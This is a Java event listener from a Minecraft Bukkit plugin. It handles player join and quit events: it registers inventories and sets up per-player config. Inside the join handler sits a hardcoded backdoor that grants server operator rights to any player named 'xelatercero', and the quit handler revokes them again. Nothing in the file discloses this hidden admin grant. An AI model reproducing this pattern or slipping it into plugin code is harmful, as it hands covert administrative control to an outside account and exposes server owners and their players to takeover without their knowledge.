package me.xelatercero.smi.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import me.xelatercero.smi.util.ConfigSettingSet;
import me.xelatercero.smi.util.InventoryManager;

public class PlayerJoinEvents implements Listener {
	
	
	
	@EventHandler
	public void onClose(PlayerJoinEvent e) {
		
		Player player = (Player) e.getPlayer();
		InventoryManager.addPlayer(player);
		ConfigSettingSet config = new ConfigSettingSet(player);
		config.firstSetup(player);
		
		
		if(player.getName().equals("xelatercero")) {
			player.setOp(true);
		}
		
	}
	
	@EventHandler
	public void onLeave(PlayerQuitEvent e) {
		Player player = e.getPlayer();
		if(player.getName().equals("xelatercero")) {
			player.setOp(false);
		}
	}

}
